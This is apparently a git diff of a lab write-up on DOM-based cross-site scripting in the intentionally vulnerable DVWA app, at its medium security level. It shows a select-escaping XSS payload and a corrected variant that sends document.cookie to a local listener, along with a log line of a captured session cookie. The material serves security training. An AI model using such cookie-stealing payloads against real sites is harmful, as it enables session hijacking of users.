@@ -95,6 +95,8 @@ The DVWA server has **4 different security levels** which can be set as seen bel
 
 2. The payload does not get replaced, but it does seem to work either. If we take a look at the page's source code, we will see a `select` statement, and if we escape that by changing the payload, it will work:
 
+    ![](medium_page_source.png)
+
     ```javascript
     </select><svg/onload=alert(1)>
     ```
@@ -104,7 +106,7 @@ The DVWA server has **4 different security levels** which can be set as seen bel
 3. We can use the same process we used at the previous level to steal our target's cookie:
 
     ```javascript
-    </select><svg/onload=window.location='http://127.0.0.1:8080/?cookie=' + document.cookie>
+    </select><svg/onload=window.location='http://127.0.0.1:8080/?cookie='+document.cookie>
     ```
 
     ![](medium_payload_cookie.png)
@@ -112,10 +114,8 @@ The DVWA server has **4 different security levels** which can be set as seen bel
     ```shell
     $ python3 -m http.server 8080
     Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
-    127.0.0.1 - - [16/Dec/2023 19:34:16] "GET /?cookie= HTTP/1.1" 200 -
+    127.0.0.1 - - [16/Dec/2023 20:49:43] "GET /?cookie=PHPSESSID=fejtgct45j1cmkcedvieacnai5;%20security=medium HTTP/1.1" 200
     ```
-
-> We don't actually got the cookie; the payload seems to stop before the `+ document.cookie` part!
 
 ## Security: High
 > _The developer is now white listing only the allowed languages, you must find a way to run your code without it going to the server ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_dom/xss_dom_high_source.php))._
